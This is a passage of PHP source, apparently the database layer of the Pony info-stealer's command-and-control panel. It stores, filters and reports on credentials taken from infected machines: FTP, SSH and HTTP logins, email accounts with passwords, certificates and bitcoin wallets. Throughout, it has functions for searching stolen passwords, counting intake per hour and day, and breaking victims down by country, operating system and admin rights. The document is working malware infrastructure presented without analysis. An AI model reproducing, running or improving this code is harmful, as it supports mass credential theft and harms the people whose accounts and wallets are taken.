        $query .= ')'; // SELECT

    	if (strlen($report_source_ip) && !strlen($report_hwid))
    	{
            $query .= " UNION (". str_replace('%s', CPONY_LOG_TABLE, "SELECT %s.log_id as log_id, %s.report_id, %s.log_line, %s.import_time as import_time, %s.log_extra FROM ".CPONY_LOG_TABLE).
                " WHERE ".CPONY_LOG_TABLE.".log_source='".CLOG_SOURCE_GATE."' AND ".CPONY_LOG_TABLE.".log_extra='".mysql_real_escape_string($report_source_ip)."'";
            
            if ($filter_notify != '1')
                $query .= " AND ".CPONY_LOG_TABLE.".log_type<>'notify'";
            
            $query .= ")";		
        }

        $result = mysql_query($query, $this->db_link);
        
		if (!$result)
		{
			$this->state = false;
		} else
		{
			return mysql_num_rows($result);
		}
		
		return false;	
	}	

	function get_report_list_filter(&$domain_list, $limit_start = 0, $limit_count = 0, $report_source_ip, $report_hwid, $filter_nonparsed, $filter_has_passwords, $filter_string = '')
	{
    	$limit_start = intval($limit_start);
    	$limit_count = intval($limit_count);
    	$filter_nonparsed = trim($filter_nonparsed);
    	$report_source_ip = trim($report_source_ip);
    	$report_hwid = trim($report_hwid);
    	$filter_has_passwords = trim($filter_has_passwords);
    	$filter_string = trim($filter_string);
    	if ($filter_has_passwords == '1')
    		$filter_has_passwords = '0';
		else
			$filter_has_passwords = '1';
		if ($filter_nonparsed == '1')
			$filter_has_passwords = '0';
    	if (!$this->state || $limit_count < 0 || $limit_start < 0)
    		return false;
    				
    	// SELECT
    	$query = "SELECT pony_report.*, OCTET_LENGTH(data) as report_len, (SELECT COUNT(*) FROM pony_ftp WHERE pony_ftp.report_id=pony_report.report_id)+(SELECT COUNT(*) FROM pony_email WHERE pony_email.report_id=pony_report.report_id)+(SELECT COUNT(*) FROM pony_cert WHERE pony_cert.report_id=pony_report.report_id)+(SELECT COUNT(*) FROM pony_wallet WHERE pony_wallet.report_id=pony_report.report_id) as count FROM ".CPONY_REPORT_TABLE." LEFT JOIN pony_report_data USING (data_id)";

    	// WHERE clause
    	if ($filter_nonparsed == '1')
    		$query .= " WHERE pony_report.parsed='0'";
    	else
    	{
			$query .= ' WHERE TRUE';
		}

		// append has passwords filter
		if ($filter_has_passwords == '1')
		{
			$query .= ' AND (EXISTS(SELECT * FROM pony_ftp WHERE pony_report.report_id=pony_ftp.report_id LIMIT 1)
				OR EXISTS(SELECT * FROM pony_email WHERE pony_report.report_id=pony_email.report_id LIMIT 1)
				OR EXISTS(SELECT * FROM pony_cert WHERE pony_report.report_id=pony_cert.report_id LIMIT 1)
				OR EXISTS(SELECT * FROM pony_wallet WHERE pony_report.report_id=pony_wallet.report_id LIMIT 1)
				)';
		}

		// apply string filter
		if (strlen($filter_string))
		{
			$query .= ' AND (EXISTS(SELECT * FROM pony_ftp WHERE pony_report.report_id=pony_ftp.report_id AND pony_ftp.url LIKE \'%'.mysql_real_escape_string($filter_string).'%\' LIMIT 1)';
			$query .= ' OR EXISTS(SELECT * FROM pony_email WHERE pony_report.report_id=pony_email.report_id AND ((pony_email.port=0 AND CONCAT(pony_email.protocol,\'://\',pony_email.email,\'|\',pony_email.server,\'|\',pony_email.user,\'|\',pony_email.pass) LIKE \'%'.mysql_real_escape_string($filter_string).'%\')
						OR (pony_email.port<>0 AND CONCAT(pony_email.protocol,\'://\',pony_email.email,\'|\',pony_email.server,\':\',pony_email.port,\'|\',pony_email.user,\'|\',pony_email.pass) LIKE \'%'.mysql_real_escape_string($filter_string).'%\')) 
						LIMIT 1)';
			$query .= ')';
		}

    	// append IP filter
    	if (strlen($report_source_ip))
    		$query .= ' AND '.CPONY_REPORT_TABLE.'.report_source_ip=\''.mysql_real_escape_string($report_source_ip).'\'';
    	// append HWID filter
    	if (strlen($report_hwid))
    		$query .= ' AND '.CPONY_REPORT_TABLE.'.report_hwid=\''.mysql_real_escape_string($report_hwid).'\'';
    		
    	// sorting
    	$query .= " ORDER BY pony_report.report_id DESC";
    		
		// limiting
    	if ($limit_start != 0 || $limit_count != 0)
    		$query .= sprintf(" LIMIT %s, %s",
						mysql_real_escape_string($limit_start),
						mysql_real_escape_string($limit_count));

		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
			{
				array_push($domain_list, $row);
			}
			return true;
		}
		
		return false;			
	}	
	
	function get_report_row_count_filter($report_source_ip = '', $report_hwid = '', $filter_nonparsed = '', $filter_has_passwords = '', $filter_string = '')
	{
		$filter_string = trim($filter_string);
    	$report_source_ip = trim($report_source_ip);
    	$report_hwid = trim($report_hwid);
    	$filter_nonparsed = trim($filter_nonparsed);
    	$filter_has_passwords = trim($filter_has_passwords);
    	if ($filter_has_passwords == '1')
    		$filter_has_passwords = '0';
		else
			$filter_has_passwords = '1';
		if ($filter_nonparsed == '1')
			$filter_has_passwords = '0';
    	if (!$this->state)
    		return false;

		// SELECT
    	$query = "SELECT pony_report.report_id FROM ".CPONY_REPORT_TABLE;

		// WHERE clause
    	if ($filter_nonparsed == '1')
    		$query .= " WHERE pony_report.parsed='0'";
    	else
    	{
			$query .= ' WHERE TRUE';
		}

		if ($filter_has_passwords == '1')
		{
			$query .= ' AND (EXISTS(SELECT * FROM pony_ftp WHERE pony_report.report_id=pony_ftp.report_id LIMIT 1)
				OR EXISTS(SELECT * FROM pony_email WHERE pony_report.report_id=pony_email.report_id LIMIT 1)
				OR EXISTS(SELECT * FROM pony_cert WHERE pony_report.report_id=pony_cert.report_id LIMIT 1)
				OR EXISTS(SELECT * FROM pony_wallet WHERE pony_report.report_id=pony_wallet.report_id LIMIT 1)
				)';
		}

		// apply string filter
		if (strlen($filter_string))
		{
			$query .= ' AND (EXISTS(SELECT * FROM pony_ftp WHERE pony_report.report_id=pony_ftp.report_id AND pony_ftp.url LIKE \'%'.mysql_real_escape_string($filter_string).'%\' LIMIT 1)';
			$query .= ' OR EXISTS(SELECT * FROM pony_email WHERE pony_report.report_id=pony_email.report_id AND ((pony_email.port=0 AND CONCAT(pony_email.protocol,\'://\',pony_email.email,\'|\',pony_email.server,\'|\',pony_email.user,\'|\',pony_email.pass) LIKE \'%'.mysql_real_escape_string($filter_string).'%\')
						OR (pony_email.port<>0 AND CONCAT(pony_email.protocol,\'://\',pony_email.email,\'|\',pony_email.server,\':\',pony_email.port,\'|\',pony_email.user,\'|\',pony_email.pass) LIKE \'%'.mysql_real_escape_string($filter_string).'%\')) 
						LIMIT 1)';
			$query .= ')';
		}

		// append IP filter
    	if (strlen($report_source_ip))
    		$query .= ' AND '.CPONY_REPORT_TABLE.'.report_source_ip=\''.mysql_real_escape_string($report_source_ip).'\'';
		// append HWID filter
    	if (strlen($report_hwid))
    		$query .= ' AND '.CPONY_REPORT_TABLE.'.report_hwid=\''.mysql_real_escape_string($report_hwid).'\'';    		

		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			return mysql_num_rows($result);
		}
		return false;	
	}	

	function get_report_linked_passwords_count($report_id)
	{
		$report_id = intval($report_id);
    	if (!$this->state)
    		return false;
    		
		$query = sprintf("SELECT COUNT(*) as count FROM %s WHERE report_id='%s'", CPONY_FTP_TABLE, $report_id);
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			if ($row = mysql_fetch_assoc($result))
			{                    
				return $row['count'];
			}
			return true;
		}
		
		return false;			
	}
		
	function delete_log_items()
	{
    	if (!$this->state)
    		return false;

		$query = sprintf("DELETE FROM %s WHERE (log_source='%s' OR log_source='%s')", mysql_real_escape_string(CPONY_LOG_TABLE), mysql_real_escape_string(CLOG_SOURCE_REPORT),
			mysql_real_escape_string(CLOG_SOURCE_GATE));
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			return true;
		}
		
		return false;			
	}	
	
	function get_last_24_mins()
	{
		$result = 23*60*60;
		$time = (time()-23*60*60)%(60*60);
		return $result+$time;
	}

	function get_last_30_days()
	{
		$result = 24*60*60*27;
		$time = (time()-24*60*60*27)%(24*60*60);
		return $result+$time;
	}

	function get_ftp_count_last_24_hours(&$out_array)
	{
    	if (!$this->state)
    		return false;		

		$time = $this->get_last_24_mins();
		$query = 'SELECT HOUR(import_time) as hour, COUNT(*) as count
			FROM pony_ftp
			WHERE (url_type=\'ftp\' OR url_type=\'ssh\') AND (import_time >= DATE_SUB(\''.mysql_real_escape_string(mysql_now_date()).'\',INTERVAL '.$time.' SECOND))
			GROUP BY HOUR(import_time)';
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[intval($row['hour'])] = $row['count'];
			return true;
		}
		
		return false;			
	}

	function get_http_count_last_24_hours(&$out_array)
	{
		if (!$this->state)
			return false;

		$time = $this->get_last_24_mins();
		$query = 'SELECT HOUR(import_time) as hour, COUNT(*) as count
			FROM pony_ftp
			WHERE (url_type=\'http\' OR url_type=\'https\') AND (import_time >= DATE_SUB(\''.mysql_real_escape_string(mysql_now_date()).'\',INTERVAL '.$time.' SECOND))
			GROUP BY HOUR(import_time)';

		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[intval($row['hour'])] = $row['count'];
			return true;
		}

		return false;
	}

	function get_email_count_last_24_hours(&$out_array)
	{
    	if (!$this->state)
    		return false;		
    		
		$time = $this->get_last_24_mins();
		$query = 'SELECT HOUR(import_time) as hour, COUNT(*) as count
			FROM pony_email
			WHERE (import_time >= DATE_SUB(\''.mysql_real_escape_string(mysql_now_date()).'\',INTERVAL '.$time.' SECOND))
			GROUP BY HOUR(import_time)';
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[intval($row['hour'])] = $row['count'];
			return true;
		}
		
		return false;			
	}

	function get_report_count_last_24_hours(&$out_array)
	{
    	if (!$this->state)
    		return false;		
    		
		$time = $this->get_last_24_mins();
		$query = 'SELECT HOUR(import_time) as hour, COUNT(*) as count
			FROM pony_report
			WHERE (import_time >= DATE_SUB(\''.mysql_real_escape_string(mysql_now_date()).'\',INTERVAL '.$time.' SECOND))
			GROUP BY HOUR(import_time)';
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[intval($row['hour'])] = $row['count'];
			return true;
		}
		
		return false;			
	}

	function get_email_count_last_month(&$out_array)
	{
    	if (!$this->state)
    		return false;

		$time = $this->get_last_30_days();
		$query = 'SELECT DAY(import_time) as day, COUNT(*) as count
			FROM pony_email
			WHERE (import_time >= DATE_SUB(\''.mysql_real_escape_string(mysql_now_date()).'\',INTERVAL '.$time.' SECOND))
			GROUP BY DAY(import_time)';
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[intval($row['day'])] = $row['count'];
			return true;
		}
		return false;			
	}

	function get_ftp_count_last_month(&$out_array)
	{
    	if (!$this->state)
    		return false;

		$time = $this->get_last_30_days();
		$query = 'SELECT DAY(import_time) as day, COUNT(*) as count
			FROM pony_ftp
			WHERE (url_type=\'ftp\' OR url_type=\'ssh\') AND (import_time >= DATE_SUB(\''.mysql_real_escape_string(mysql_now_date()).'\',INTERVAL '.$time.' SECOND))
			GROUP BY DAY(import_time)';
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[intval($row['day'])] = $row['count'];
			return true;
		}
		return false;			
	}


	function get_http_count_last_month(&$out_array)
	{
		if (!$this->state)
			return false;

		$time = $this->get_last_30_days();
		$query = 'SELECT DAY(import_time) as day, COUNT(*) as count
			FROM pony_ftp
			WHERE (url_type=\'http\' OR url_type=\'https\') AND (import_time >= DATE_SUB(\''.mysql_real_escape_string(mysql_now_date()).'\',INTERVAL '.$time.' SECOND))
			GROUP BY DAY(import_time)';

		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[intval($row['day'])] = $row['count'];
			return true;
		}
		return false;
	}

	function get_report_count_last_month(&$out_array)
	{
    	if (!$this->state)
    		return false;

		$time = $this->get_last_30_days();
		$query = 'SELECT DAY(import_time) as day, COUNT(*) as count
			FROM pony_report
			WHERE (import_time >= DATE_SUB(\''.mysql_real_escape_string(mysql_now_date()).'\',INTERVAL '.$time.' SECOND))
			GROUP BY DAY(import_time)';
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[intval($row['day'])] = $row['count'];
			return true;
		}
		return false;			
	}	

	function get_url_password_stats(&$out_array, $offset)
	{
    	if (!$this->state)
    		return false;		
    		
		$query = 'SELECT url_type, COUNT(*) as count
			FROM pony_ftp
			WHERE ftp_id >= '.mysql_real_escape_string($offset).'
			GROUP BY url_type
			';
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[$row['url_type']] = $row['count'];
			return true;
		}
		return false;			
	}
	
	function get_ftp_clients_stats(&$out_array)
	{
    	if (!$this->state)
    		return false;		
    		
		$query = 'SELECT ftp_client, COUNT(*) as count
			FROM pony_ftp

			WHERE (url_type=\'ftp\') OR (url_type=\'ssh\')

			GROUP BY ftp_client
			ORDER BY count DESC
			
			';
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[$row['ftp_client']] = $row['count'];
			return true;
		}
		return false;			
	}

	function get_http_clients_stats(&$out_array)
	{
		if (!$this->state)
			return false;

		$query = 'SELECT ftp_client, COUNT(*) as count
			FROM pony_ftp

			WHERE (url_type=\'http\') OR (url_type=\'https\')

			GROUP BY ftp_client
			ORDER BY count DESC

			';

		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[$row['ftp_client']] = $row['count'];
			return true;
		}
		return false;
	}

	function get_bitcoin_clients_stats(&$out_array)
	{
		if (!$this->state)
			return false;

		$query = 'SELECT wallet_client, COUNT(*) as count
			FROM pony_wallet

			GROUP BY wallet_client
			ORDER BY count DESC

			';

		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[$row['wallet_client']] = $row['count'];
			return true;
		}
		return false;
	}

	function get_email_clients_stats(&$out_array)
	{
		if (!$this->state)
			return false;

		$query = 'SELECT email_client, COUNT(*) as count
			FROM pony_email

			GROUP BY email_client
			ORDER BY count DESC

			';

		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[$row['email_client']] = $row['count'];
			return true;
		}
		return false;
	}

	function get_os_stats(&$out_array)
	{
    	if (!$this->state)
    		return false;		
    		
		$query = "SELECT report_os_name, COUNT(*) as count
			FROM pony_report
			
			WHERE parsed='1'
			GROUP BY report_os_name
			ORDER BY count DESC
			
			";
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[$row['report_os_name']] = $row['count'];
			return true;
		}
		return false;			
	}		

	function get_email_country_stats(&$out_array)
	{
    	if (!$this->state)
    		return false;		
    		
		$query = "SELECT report_country, COUNT(*) as email_count FROM pony_email INNER JOIN pony_report USING (report_id)

			WHERE (parsed='1')
			GROUP BY report_country
			";
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[$row['report_country']] = array('email_count'=>$row['email_count']);
			return true;
		}
		return false;			
	}

	function get_cert_country_stats(&$out_array)
	{
    	if (!$this->state)
    		return false;		
    		
		$query = "SELECT report_country, COUNT(*) as cert_count FROM pony_cert INNER JOIN pony_report USING (report_id)

			WHERE (parsed='1')
			GROUP BY report_country
			";
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[$row['report_country']] = array('cert_count'=>$row['cert_count']);
			return true;
		}
		return false;			
	}

	function get_wallet_country_stats(&$out_array)
	{
    	if (!$this->state)
    		return false;		
    		
		$query = "SELECT report_country, COUNT(*) as wallet_count FROM pony_wallet INNER JOIN pony_report USING (report_id)

			WHERE (parsed='1')
			GROUP BY report_country
			";
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[$row['report_country']] = array('wallet_count'=>$row['wallet_count']);
			return true;
		}
		return false;			
	}

	function get_ftp_country_stats(&$out_array)
	{
    	if (!$this->state)
    		return false;		
    		
		$query = "SELECT report_country, COUNT(*) as ftp_count FROM pony_ftp INNER JOIN pony_report USING (report_id)

			WHERE (url_type='ftp' OR url_type='ssh') AND (parsed='1')
			GROUP BY report_country
			";
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[$row['report_country']] = array('ftp_count'=>$row['ftp_count']);
			return true;
		}
		return false;			
	}

	function get_all_country_stats(&$out_array)
	{
    	if (!$this->state)
    		return false;		
    		
		$query = "SELECT report_country, COUNT(*) as ftp_count FROM pony_ftp INNER JOIN pony_report USING (report_id)

			WHERE parsed='1'
			GROUP BY report_country
			";
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[$row['report_country']] = array('ftp_count'=>$row['ftp_count']);
			return true;
		}
		return false;			
	}
	
	function get_country_stats(&$out_array)
	{
    	if (!$this->state)
    		return false;		
    		
		$query = "SELECT report_country, COUNT(*) as count
			FROM pony_report

			WHERE parsed='1'
			GROUP BY report_country
			ORDER BY count DESC, import_time ASC
			";
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[$row['report_country']] = array('report_count'=>$row['count']);
			return true;
		}
		return false;			
	}
		
	function get_64bit_stats(&$out_array)
	{
    	if (!$this->state)
    		return false;		
    		
		$query = "SELECT report_is_win64, COUNT(*) as count
			FROM pony_report
			
			WHERE parsed='1'
			GROUP BY report_is_win64
			ORDER BY count DESC
			
			";
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[$row['report_is_win64']] = $row['count'];
			return true;
		}
		return false;			
	}	
	
	function get_admin_stats(&$out_array)
	{
    	if (!$this->state)
    		return false;		
    		
		$query = "SELECT report_admin, COUNT(*) as count
			FROM pony_report
			
			WHERE parsed='1'
			GROUP BY report_admin
			ORDER BY count DESC			
			
			";
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
				$out_array[$row['report_admin']] = $row['count'];
			return true;
		}
		return false;			
	}

	function get_duplicate_report_count($offset = 0)
	{
    	if (!$this->state)
    		return false;		
    		
		$offset = intval($offset);
		$query = sprintf("SELECT COUNT(*) as count
			FROM pony_system_log
			
			WHERE (log_source='%s' AND log_line='NOTIFY_GATE_DUPLICATE_REPORT') AND (log_id >= '%s')
			", mysql_real_escape_string(CLOG_SOURCE_GATE), mysql_real_escape_string($offset));
		
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			if ($row = mysql_fetch_assoc($result))
				return $row['count'];
		}
		return false;
	}

	function get_domain_name_by_id($domain_id)
	{
    	if (!$this->state)
    		return false;		

		$query = 'SELECT url_domain
			FROM pony_domainlist
			WHERE domain_id=\''.mysql_real_escape_string($domain_id).'\'
			LIMIT 1';

		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			if ($row = mysql_fetch_assoc($result))
			{
				return $row['url_domain'];
			}
			return true;
		}
		return false;			
			
	}

	function get_http_domain_stats(&$out_array)
	{
    	if (!$this->state)
    		return false;		

		$query = 'SELECT tbl.domain_id, COUNT(*) as count
			FROM (SELECT domain_id FROM pony_ftp WHERE url_type=\'http\' OR url_type=\'https\') as tbl
			WHERE domain_id != 0
			GROUP BY tbl.domain_id
			ORDER BY count DESC
			LIMIT 20
			';
		
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			while ($row = mysql_fetch_assoc($result))
			{
				$out_array[$this->get_domain_name_by_id($row['domain_id'])] = $row['count'];
			}
			return true;
		}
		return false;			
	}

	function get_admin_name()
	{
		$query = sprintf("SELECT username FROM pony_user WHERE privileges='admin_all' LIMIT 1");
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			if ($row = mysql_fetch_assoc($result))
			{
				return $row['username'];
			}
		}
		return false;
	}
	
	function get_option($option_name, $user_name = '', $default = '')
	{
		$user_name = trim($user_name);
    	if (!$this->state)
    		return $default;
    		
    	if ($user_name == '')
    	{
    		$user_name = $this->get_admin_name();
    		if ($user_name === false)
    			return $default;
		}
    		
		$query = sprintf("SELECT settings FROM pony_user WHERE username='%s'", 
			mysql_real_escape_string($user_name));
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			if ($row = mysql_fetch_assoc($result))
			{
				$options = $row['settings'];
				$ini_array = parse_ini($options);
				if (is_array($ini_array) && isset($ini_array[$option_name]))
					return trim(base64_decode(strtr($ini_array[$option_name], '-_,', '+/='), true));
				else
					return $default;
			}
		}
		return $default;
	}

	function get_multi_option($option_name, $option_count, $user_name = '')
	{
		$return_str = $this->get_option($option_name, $user_name);
		if (!$return_str)
			$return_str = '0';
		$return_array = explode('|', $return_str);
		while (count($return_array) < $option_count)
		{
			$return_array[] = '0';
		}
		return $return_array;
	}

	function set_multi_option($option_name, $option_values, $user_name = '')
	{
		return $this->set_option($option_name, implode("|", $option_values), $user_name);
	}

	function set_option($option_name, $option_value, $user_name = '')
	{
		$user_name = trim($user_name);
		$option_name = trim($option_name);
		$option_value = trim($option_value);
    	if (!$this->state)
    		return false;		
    		
    	if ($user_name == '')
    	{
    		$user_name = $this->get_admin_name();
    		if ($user_name === false)
    			return false;
		}

		$query = sprintf("SELECT settings FROM pony_user WHERE username='%s'", 
			mysql_real_escape_string($user_name));
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
			return false;
		}

		if ($row = mysql_fetch_assoc($result))
		{
			$settings = $row['settings'];
		} else
			return false;

		if ($option_name == '')
			$option_name = 'default';
			
		$ini_array = parse_ini($settings);
		$ini_array[$option_name] = strtr(base64_encode($option_value), '+/=', '-_,');
		$ini_string = collect_ini_array($ini_array);
    		
		$query = sprintf("UPDATE pony_user SET settings='%s' WHERE username='%s'", 
			mysql_real_escape_string($ini_string), 
			mysql_real_escape_string($user_name));
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			return true;
		}
		return false;
	}
	
	function optimize_table($table_name)
	{
		$table_name = trim($table_name);
    	if (!$this->state || !strlen($table_name))
    		return false;		

		$query = sprintf('OPTIMIZE TABLE %s', mysql_real_escape_string($table_name));
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			return true;
		}
		return false;
	}

	function drop_table($table_name)
	{
		$table_name = trim($table_name);
    	if (!$this->state || !strlen($table_name))
    		return false;		

		$query = sprintf('DROP TABLE IF EXISTS %s', mysql_real_escape_string($table_name));
		$result = mysql_query($query, $this->db_link);

		if (!$result)
		{
			$this->state = false;
		} else
		{
			return true;
		}
		return false;
	}

	function report_remove_errors($report_id)
	{
		$report_id = intval($report_id);

		if (!$this->state || $report_id <= 0)
			return false;

		$query = sprintf("DELETE FROM pony_system_log WHERE report_id='%s'", mysql_real_escape_string($report_id));
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			return true;
		}
		return false;
	}

	function get_auto_value($table_name)
	{
		$table_name = trim($table_name);
    	if (!$this->state || !strlen($table_name))
    		return false;		

		$query = sprintf('SHOW TABLE STATUS LIKE \'%s\'', mysql_real_escape_string($table_name));
		$result = mysql_query($query, $this->db_link);
		if (!$result)
		{
			$this->state = false;
		} else
		{
			if ($row = mysql_fetch_assoc($result))
			{
				return $row['Auto_increment'];
			}
		}
		return false;
	}

	function get_offset_value_count($query, $value_id, $table_name)
	{
		$table_name = trim($table_name);
    	if (!$this->state || !strlen($table_name))
    		return false;		

		$query = sprintf('SELECT MIN(%s) as idx, COUNT(*) as count FROM `%s` ', mysql_real_escape_string($value_id), mysql_real_escape_string($table_name)).$query;
		$result = mysql_query($query, $this->db_link);
		if (!$result)
		{
			$this->state = false;
		} else
		{
			if ($row = mysql_fetch_assoc($result))
			{
				return array($row['idx'], $row['count']);
			}
		}
		return false;		
	}

	function lock_all_tables()
	{
		if (!$this->state)
			return false;

		$query = "LOCK TABLES ".implode(' WRITE, ', $this->required_tables)." WRITE";
		$result = mysql_query($query, $this->db_link);
		if (!$result)
		{
			$this->state = false;
		} else
		{
			return true;
		}
		return false;		
	}

	function unlock_all_tables()
	{
		// try to unlock at any state
		/*if (!$this->state)
			return false;*/

		$query = "UNLOCK TABLES";
		$result = mysql_query($query, $this->db_link);
		if (!$result)
		{
			$this->state = false;
		} else
		{
			return true;
		}
		return false;		
	}

	function report_remove($report_id)
	{
		$report_id = intval($report_id);

		if (!$this->state || $report_id <= 0)
			return false;

		
		$query = sprintf("DELETE FROM pony_report_data USING pony_report_data INNER JOIN pony_report USING (data_id) WHERE report_id='%s'", mysql_real_escape_string($report_id));
		$result = mysql_query($query, $this->db_link);
		
		if (!$result)
		{
			$this->state = false;
		} else
		{
			$query = sprintf("DELETE FROM pony_report WHERE report_id='%s'", mysql_real_escape_string($report_id));
			$result = mysql_query($query, $this->db_link);
		
			if (!$result)
			{
				$this->state = false;
			} else
			{
				return true;
			}
		}
		return false;
	}
}

